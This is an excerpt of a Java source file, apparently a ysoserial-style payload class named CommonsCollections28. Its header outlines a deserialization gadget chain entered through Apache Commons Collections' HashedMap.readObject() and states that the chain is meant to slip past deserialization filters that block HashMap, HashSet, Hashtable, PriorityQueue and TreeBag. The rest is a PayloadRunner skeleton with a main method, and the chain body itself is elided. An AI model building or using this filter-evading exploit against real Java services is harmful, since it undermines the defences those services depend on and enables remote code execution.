...
/*
	HashedMap entry point — bypasses HashMap/HashSet/Hashtable/PQ/TreeBag filters.

	Gadget chain:
		ObjectInputStream.readObject()
			HashedMap.readObject()            // AbstractHashedMap.doReadObject()
	...
	HashedMap is an AbstractHashedMap subclass. Its readObject reads entries
	and calls addMapping() which hashes keys via hashCode(). Not in any
	known ysoserial chain or filter list.

	Filter evasion:
		1. HashedMap (o.a.c.c.map) — not in any known filter
...
public class CommonsCollections28 extends PayloadRunner implements ObjectPayload<Serializable> {
	...
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections28.class, args);
	}
}
